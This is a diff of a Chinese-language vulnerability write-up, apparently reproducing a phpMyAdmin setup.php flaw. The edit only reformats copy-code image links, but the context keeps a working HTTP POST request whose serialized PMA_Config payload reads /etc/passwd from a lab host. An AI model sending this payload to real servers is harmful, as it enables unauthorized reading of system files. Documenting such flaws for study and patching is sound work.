@@ -90,7 +90,7 @@ http://192.168.52.129:8080/scripts/setup.php
 
 发送如下数据包，即可读取`/etc/passwd`
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 ```http
 POST /scripts/setup.php HTTP/1.1
@@ -107,7 +107,7 @@ action=test&configuration=O:10:"PMA\_Config":1:{s:6:"source",s:11:"/etc/passwd";
 
 ```
 
-[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")
+`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`
 
 ![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327095005500-1274656986.png)
 
